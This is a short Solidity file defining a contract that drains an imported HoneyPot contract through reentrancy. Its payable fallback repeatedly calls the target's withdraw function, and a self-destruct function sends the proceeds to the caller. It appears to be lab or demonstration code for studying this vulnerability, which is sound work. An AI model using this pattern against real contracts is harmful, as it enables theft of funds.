pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {

    HoneyPot public honeypot;

    constructor (address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }

    function kill () external {
        selfdestruct(msg.sender);
    }

    function collect() external payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    function () external payable {
        if (address(honeypot).balance >= msg.value) {
            honeypot.get();
        }
    }

}
